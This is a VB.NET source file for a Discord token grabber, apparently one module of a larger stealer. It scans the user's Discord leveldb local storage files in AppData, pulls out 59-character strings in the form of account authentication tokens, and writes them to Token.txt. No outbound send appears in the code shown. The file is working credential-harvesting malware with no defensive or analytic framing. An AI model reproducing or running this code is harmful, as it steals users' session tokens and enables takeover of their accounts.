Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Text.RegularExpressions

Namespace Other
    Public Class DiscordToken
        Public Function GetToken()
            Dim files = SearchForFile()

            If files.Count = 0 Then
                Return False

                Exit Function
            End If

            For Each token As String In files

                For Each match As Match In Regex.Matches(token, "[^""]*")

                    If match.Length = 59 Then
                        Using sw As StreamWriter = New StreamWriter("Token.txt", True)
                            sw.WriteLine("Token=" & match.ToString())
                        End Using
                    End If
                Next
            Next
        End Function

        Private Function SearchForFile() As List(Of String)
            Dim ldbFiles As List(Of String) = New List(Of String)()
            Dim discordPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\discord\Local Storage\leveldb\"

            If Not Directory.Exists(discordPath) Then
                Return ldbFiles
            End If

            For Each file As String In Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly)
                Dim rawText As String = IO.File.ReadAllText(file)

                If rawText.Contains("oken") Then
                    ldbFiles.Add(rawText)
                End If
            Next

            Return ldbFiles
        End Function
    End Class
End Namespace